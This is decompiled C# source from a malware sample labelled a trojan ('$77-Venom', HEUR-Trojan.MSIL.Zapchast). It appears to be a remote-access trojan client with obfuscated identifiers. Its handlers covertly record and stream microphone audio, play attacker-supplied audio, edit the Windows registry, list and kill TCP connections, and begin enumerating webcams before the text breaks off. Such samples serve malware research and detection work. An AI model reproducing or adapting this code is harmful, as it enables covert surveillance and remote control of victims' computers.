// Decompiled with JetBrains decompiler
// Type: 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦⳩⟥蕱㫂ȯ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using NAudio.Wave;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.AForge.Video.DirectShow;
using xClient.Core.NAudio.Wave;
using xClient.Core.NAudio.Wave.WaveInputs;
using xClient.Core.NAudio.Wave.WaveOutputs;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Registry;
using xClient.Core.Utilities;

public static class 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ
{
  public static bool \uEEE2芰嫪\uF6FF薱\uF0C9\uFFD1\uFFFD谮䄈前캌핷\u2F2E赦껀駹餼䫴ᬍ;
  public static bool \u0D78ㅔ췿썭㣵ﰴ쟟냅\uF0B0꺈\u32C5Ȧ踏裓\uE532寄뫚듪Ṏ\u2EB6;
  public static 鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 涤\u21EF럦푹픓쀤呢ﵭ跚羶饝䂺\uFFE2\uE718櫩廿楫葐\uFFFD䓄;
  public static int 銤ﳡ썋㺟嶡\u265DꎻႢ呑㼍\uFFFDϡ궗\u00BFꠌ\uF3B9\uE6C7珦\uFFFD鱚;
  public static int 쫴발ʅ뱪ㄱ뉏䱄㙢射馦\uE122縲獬鶻栤\uE3D9㲱淦쾏ဉ;
  public static VideoCaptureDevice Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ;
  public static UnsafeStreamCodec \uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍;
  private static Shell 籷\uF855\u2E72\uFFFDㄸ郟䏚힊꽆犅除ﱆ錸䖾荒켫\uFFFD鈕鴚몬;
  private static Dictionary<int, string> \u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57 = new Dictionary<int, string>();
  private static Dictionary<int, string> 錒锾撷췚폰ㇰ윱ၟﵥ牌래䌊軍凵靚ᵀ킈䟖ೖ猋 = new Dictionary<int, string>();
  private const string Ὂ樍ւꃳꮺ쌠ꬂ홡명ӑធ렑闦\uEC3E놸ἣ\uFFFD䭠釲탴 = "$E$";
  private static readonly System.Threading.Semaphore 惩ᓮ糞\uEEF5肝鍀\uFFFD蔽覗\u288A蛅錄촭读氂딯ֽ뿽\u26F9\u285C = new System.Threading.Semaphore(2, 2);
  private const string \uFFFD\u28EB杠\uF78F矩陑\uE70Fᬄ\uF097\uE0AE衚鱖\u1805㹋揝喛Ҁ祃쪱失 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random ꨆ띈ٞ뛮\u2894傲䣰\uE922ꄯ\u0A5D츒ꚧᾟޒ㮹\u2EAB졒\uFFFDᣄ审 = new Random(Environment.TickCount);

  private static WaveInEvent _waveInEvent { get; set; }

  public static bool StreamRunning { get; set; }

  private static BufferedWaveProvider WaveProvider { get; set; }

  private static WaveOut WaveOut { get; set; }

  public static void 큞\u2251娱뵛劫싅랏쀊妳눸맍釀\uE81B詌Ṣ䅙鐼짎ݮᕂ(
    GetAudioDevices command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      Dictionary<string, int> audioDevices = new Dictionary<string, int>();
      int deviceCount = WaveIn.DeviceCount;
      for (int devNumber = 0; devNumber < deviceCount; ++devNumber)
      {
        ᄛꧡ㮘侺镎ᡧ\uFFC9䶵砆\uEB7E\u25D8辳왻\u2650㑎\uE940왆\u3350뢪蓨 capabilities = WaveIn.GetCapabilities(devNumber);
        audioDevices.Add(capabilities.ProductName, capabilities.Channels);
      }
      if (audioDevices.Count <= 0)
        return;
      new GetAudioDevicesResponse(audioDevices).Execute(client);
    }
    catch (Exception ex)
    {
    }
  }

  public static void ṙ\u0E76裖䀩溿㕝帍衢碠㱴\u2A9D嗭\uE879刱袅\u2E3E킜\uF3DA\uEF52鐂(
    GetAudioStream command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.ᘨﱛ觏ం竨胾䙰䶧ꝵ鎲圈\uF1AE緝씋丝᜴뢯\u1AA2ꗁ\u2D72 ᘨﱛ觏ం竨胾䙰䶧ꝵ鎲圈緝씋丝᜴뢯ꗁ = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.ᘨﱛ觏ం竨胾䙰䶧ꝵ鎲圈\uF1AE緝씋丝᜴뢯\u1AA2ꗁ\u2D72();
    // ISSUE: reference to a compiler-generated field
    ᘨﱛ觏ం竨胾䙰䶧ꝵ鎲圈緝씋丝᜴뢯ꗁ.燥ﰇ啩ꄧ\uFFFDĚ\u3285㷡蚰魰㒥젺䂗떤\uED04Ȑ롸\u296E廛㱲 = client;
    try
    {
      \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹 䑡쎣أ蕩퍳ܖ苸岐꿦ۍ遹 = new \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹(command.SampleRate, command.Channels);
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ._waveInEvent = new WaveInEvent()
      {
        BufferMilliseconds = 50,
        DeviceNumber = command.Device,
        WaveFormat = 䑡쎣أ蕩퍳ܖ苸岐꿦ۍ遹
      };
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ._waveInEvent.StartRecording();
      // ISSUE: reference to a compiler-generated method
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ._waveInEvent.DataAvailable += new EventHandler<䌫߬䋼㬈찎倐\uFFFD硇罹뽕㨇\u2BAC偩\uE74E젠ো䕙\u27B1\u33F9ⴄ>(ᘨﱛ觏ం竨胾䙰䶧ꝵ鎲圈緝씋丝᜴뢯ꗁ.\uFFFD踌鶇\uFFFD笃ঋ\u05FF羅羯ጨ\u28A1ᑺ췘퀈訦谼飖턞ؒ廋);
    }
    catch (Exception ex)
    {
    }
  }

  public static void 뚮䧥帡\uFFFD\uE163\uE0E5召슓\u1360캢菫䣆ﾱᗹ뙽ⶔ\uEBC7\u2265\uECFF㱸(
    StopAudioStream command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ._waveInEvent.StopRecording();
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ._waveInEvent.Dispose();
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.StreamRunning = false;
      new StopAudioStreamResponse(匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.StreamRunning).Execute(client);
    }
    catch (Exception ex)
    {
    }
  }

  public static void 躮ᘡ뉛쮄\uE744\uF631༿\uE62Cၳ公\uFFFD憀唿鱏찌\u28DF悒뻪\u2FAD䱄(
    DoSpeak command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.WaveOut = new WaveOut();
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.WaveProvider = new BufferedWaveProvider(new \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹());
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.WaveOut.Init((벙灘ꩌ\uFFFDິњ晘\uF867ાⴏ䑛멀뀝譝愡埩\u2225똀覉겝) 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.WaveProvider);
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.WaveProvider.AddSamples(command.SpokenData, 0, command.SpokenData.Length);
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.WaveOut.Play();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 昃\uE2E2禥놳\u27F6涝햩ꂀ螿\uFFFDᮜ巡㟑\u2747ꦩ鼄靓\u2EE5냚鍫(
    DoLoadRegistryKey packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetRegistryKeysResponse registryKeysResponse = new GetRegistryKeysResponse();
    try
    {
      RegistrySeeker registrySeeker = new RegistrySeeker();
      registrySeeker.BeginSeeking(packet.RootKeyName);
      registryKeysResponse.Matches = registrySeeker.Matches;
      registryKeysResponse.IsError = false;
    }
    catch (Exception ex)
    {
      registryKeysResponse.IsError = true;
      registryKeysResponse.ErrorMsg = ex.Message;
    }
    registryKeysResponse.RootKey = packet.RootKeyName;
    registryKeysResponse.Execute(client);
  }

  public static void \u3253칝歓ꜩ\uFFFD僒䘆ﯷȍ\u252D鷚폣\uF6A7ဵ큰\u23AD뻎㪉\u0FD4쾅(
    DoCreateRegistryKey packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetCreateRegistryKeyResponse registryKeyResponse = new GetCreateRegistryKeyResponse();
    string errorMsg = "";
    string name = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.CreateRegistryKey(packet.ParentPath, out name, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.Match = new RegSeekerMatch(name, 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u9FE6佗䴄势鄼굕\uFFFD罇싿굎ꋏ䋙顰챢㐕ᥙ\uF64D嬦慇喟(), 0);
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.Execute(client);
  }

  public static void 뽉蘾뤬程鮣\u247D泎\uF104\uEE22䆅\u23A2쮍馔델훗倒烽턴\u0871쉬(
    DoDeleteRegistryKey packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetDeleteRegistryKeyResponse registryKeyResponse = new GetDeleteRegistryKeyResponse();
    string errorMsg = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.KeyName = packet.KeyName;
    registryKeyResponse.Execute(client);
  }

  public static void 堠彟껁䒷荙ઢ塷\uFE13蠖䫅뎙ꙮઘ盔뽃脘봄慿찃喊(
    DoRenameRegistryKey packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetRenameRegistryKeyResponse registryKeyResponse = new GetRenameRegistryKeyResponse();
    string errorMsg = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.OldKeyName = packet.OldKeyName;
    registryKeyResponse.NewKeyName = packet.NewKeyName;
    registryKeyResponse.Execute(client);
  }

  public static void \u23C6퇥\uFFFD뷳\u0E6D뜇鈖댢硃硥ቾ嗰襋\u264F跎໐苑ൢ쇾\uE4BE(
    DoCreateRegistryValue packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetCreateRegistryValueResponse registryValueResponse = new GetCreateRegistryValueResponse();
    string errorMsg = "";
    string name = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out name, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.Value = new RegValueData(name, packet.Kind, packet.Kind.GetDefault());
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Execute(client);
  }

  public static void 愖\u09D9\uE885뗹涏\u2F65㚔ꇗ젭ꕫ靯怿祇\u2543螜荎䗠\u4DDB\uFFFD崎(
    DoDeleteRegistryValue packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetDeleteRegistryValueResponse registryValueResponse = new GetDeleteRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.ValueName = packet.ValueName;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Execute(client);
  }

  public static void ඟ᭬罰딴\uFFFD캨\uFFFDˇ\uFFFD\uF2E4ઉ揙豾滻䧂泀\u02C3櫣ᡈ㽋(
    DoRenameRegistryValue packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetRenameRegistryValueResponse registryValueResponse = new GetRenameRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.OldValueName = packet.OldValueName;
    registryValueResponse.NewValueName = packet.NewValueName;
    registryValueResponse.Execute(client);
  }

  public static void 䪕蓹\uFDC9藦櫓\uE333긣Ʃ瑿\uE25B쟦ピ\u220B\uFFFDㇹ䵩퇆ꑝ佰\uFFFD(
    DoChangeRegistryValue packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    GetChangeRegistryValueResponse registryValueResponse = new GetChangeRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Value = packet.Value;
    registryValueResponse.Execute(client);
  }

  public static void 障\uFFFD\uE3CC沪鏿瓯굃\u25F6瘂멚擐쟎\uE5EB㛨飒ᖗ觓秅韤\uEAD8(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client,
    GetConnections packet)
  {
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌[] 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array = 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.ᢲማ\uFFFD厖ᝫ\uE639珬뤜鬗蔆렸\u0703슳ꐪᤰ核ㅞ㰥㴯Є();
    string[] processes = new string[韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length];
    string[] localaddresses = new string[韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length];
    string[] localports = new string[韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length];
    string[] remoteadresses = new string[韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length];
    string[] remoteports = new string[韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length];
    byte[] states = new byte[韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length];
    for (int index = 0; index < 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length; ++index)
    {
      localaddresses[index] = 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].LocalAddress.ToString();
      localports[index] = 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].LocalPort.ToString();
      remoteadresses[index] = 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].RemoteAddress.ToString();
      remoteports[index] = 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].RemotePort.ToString();
      states[index] = Convert.ToByte(韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].ꦉ䆘祛崳ꭾ厥븳霳\u0877\uE8D5ᤝ託\u22C6ʅ雐ᠲ㳑巨锳\uFFFD);
      try
      {
        Process processById = Process.GetProcessById((int) 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].ꋽ턮됻ಈ휡댩蛬ꓥ\uFFFD\uF6AF\uED8A첓㟛\u275Bⶐ뗊\u2B3F炰촫늒);
        processes[index] = processById.ProcessName;
      }
      catch
      {
        processes[index] = string.Format("PID: {0}", (object) 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].ꋽ턮됻ಈ휡댩蛬ꓥ\uFFFD\uF6AF\uED8A첓㟛\u275Bⶐ뗊\u2B3F炰촫늒);
      }
    }
    new GetConnectionsResponse(processes, localaddresses, localports, remoteadresses, remoteports, states).Execute(client);
  }

  public static void \uEEB1\uE9EB뗕魛ꍅ麭縚\uED1A\uFE5F꺉\uE902즑\uE7A9䵾\uE4F5顏ၥ\uF23D\u055E\u2781(
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client,
    DoCloseConnection packet)
  {
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌[] 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array = 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.ᢲማ\uFFFD厖ᝫ\uE639珬뤜鬗蔆렸\u0703슳ꐪᤰ核ㅞ㰥㴯Є();
    bool flag = false;
    for (int index = 0; index < 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array.Length; ++index)
    {
      int num1 = packet.LocalPort;
      string str1 = num1.ToString();
      ushort num2 = 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].LocalPort;
      string str2 = num2.ToString();
      if (str1 == str2)
      {
        num1 = packet.RemotePort;
        string str3 = num1.ToString();
        num2 = 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].RemotePort;
        string str4 = num2.ToString();
        if (str3 == str4)
        {
          flag = true;
          韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index].ꦉ䆘祛崳ꭾ厥븳霳\u0877\uE8D5ᤝ託\u22C6ʅ雐ᠲ㳑巨锳\uFFFD = 12U;
          IntPtr num3 = Marshal.AllocCoTaskMem(Marshal.SizeOf((object) 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index]));
          Marshal.StructureToPtr((object) 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index], num3, false);
          匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u1F16싳点\uFFFD㠡纊熑胧\uEBF7阋芷ᅓ㻫ⸯ贝渕廭妤\uE094캴(num3);
        }
      }
    }
    if (!flag)
      return;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.障\uFFFD\uE3CC沪鏿瓯굃\u25F6瘂멚擐쟎\uE5EB㛨飒ᖗ觓秅韤\uEAD8(client, new GetConnections());
  }

  public static 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌[] ᢲማ\uFFFD厖ᝫ\uE639珬뤜鬗蔆렸\u0703슳ꐪᤰ核ㅞ㰥㴯Є()
  {
    int ipVersion = 2;
    int dwOutBufLen = 0;
    int num1 = (int) 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uFFFDᎮ켋㴸缊쳥\u26D8鼛\u0BF5짂ﵡ\uE1E1黿\u3037뾠静\uE65C掁荱惇(IntPtr.Zero, ref dwOutBufLen, true, ipVersion, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.䭖瘓䭙\uE21C爰\u295A褅龬\uFDC8뤼咶핵྆씦ｸ㥔㣇\uF3C4\u2987\u1C82.漀\u2542䑘\u2AFC\uF8FF阶嫿ꜩ탧깾ᳮ䨗攓\u1AD6囂鍬曒ԉ쐖뫯);
    IntPtr num2 = Marshal.AllocHGlobal(dwOutBufLen);
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌[] 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array;
    try
    {
      if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uFFFDᎮ켋㴸缊쳥\u26D8鼛\u0BF5짂ﵡ\uE1E1黿\u3037뾠静\uE65C掁荱惇(num2, ref dwOutBufLen, true, ipVersion, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.䭖瘓䭙\uE21C爰\u295A褅龬\uFDC8뤼咶핵྆씦ｸ㥔㣇\uF3C4\u2987\u1C82.漀\u2542䑘\u2AFC\uF8FF阶嫿ꜩ탧깾ᳮ䨗攓\u1AD6囂鍬曒ԉ쐖뫯) != 0U)
        return (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌[]) null;
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.箠䉫\uEEFE\uFFFD꼶\uECFA\uF51F葥켌ꦲ鯔䠚鷘揙믷靜\uF799\u9FF6낲㳓 structure1 = (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.箠䉫\uEEFE\uFFFD꼶\uECFA\uF51F葥켌ꦲ鯔䠚鷘揙믷靜\uF799\u9FF6낲㳓) Marshal.PtrToStructure(num2, typeof (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.箠䉫\uEEFE\uFFFD꼶\uECFA\uF51F葥켌ꦲ鯔䠚鷘揙믷靜\uF799\u9FF6낲㳓));
      IntPtr ptr = (IntPtr) ((long) num2 + (long) Marshal.SizeOf((object) structure1.抨镖礫せ온\uE501鑓垑굉쥰﹏哣뫷鑉ﺨ썸褝핆佳銂));
      韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌[(int) structure1.抨镖礫せ온\uE501鑓垑굉쥰﹏哣뫷鑉ﺨ썸褝핆佳銂];
      for (int index = 0; (long) index < (long) structure1.抨镖礫せ온\uE501鑓垑굉쥰﹏哣뫷鑉ﺨ썸褝핆佳銂; ++index)
      {
        匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌 structure2 = (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌) Marshal.PtrToStructure(ptr, typeof (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌));
        韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array[index] = structure2;
        ptr = (IntPtr) ((long) ptr + (long) Marshal.SizeOf((object) structure2));
      }
    }
    finally
    {
      Marshal.FreeHGlobal(num2);
    }
    return 韾ꐩۿ㯠Ӎ赃绡磰ꞑ툸شꍯ稹畷댌䑇䴌Array;
  }

  [DllImport("iphlpapi.dll", EntryPoint = "GetExtendedTcpTable", SetLastError = true)]
  private static extern uint \uFFFDᎮ켋㴸缊쳥\u26D8鼛\u0BF5짂ﵡ\uE1E1黿\u3037뾠静\uE65C掁荱惇(
    IntPtr pTcpTable,
    ref int dwOutBufLen,
    bool sort,
    int ipVersion,
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.䭖瘓䭙\uE21C爰\u295A褅龬\uFDC8뤼咶핵྆씦ｸ㥔㣇\uF3C4\u2987\u1C82 tblClass,
    uint reserved = 0);

  [DllImport("iphlpapi.dll", EntryPoint = "SetTcpEntry")]
  private static extern int \u1F16싳点\uFFFD㠡纊熑胧\uEBF7阋芷ᅓ㻫ⸯ贝渕廭妤\uE094캴(IntPtr pTcprow);

  public static void \uED1D\uFFFD\u088A稧귑ᕯ饡\u1C9Fᣟ喌嵸濒冕찶\uE6C2ٍ\uE6A0\u205A걙嵫(
    GetWebcams command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    Dictionary<string, List<Size>> webcams = new Dictionary<string, List<Size>>();
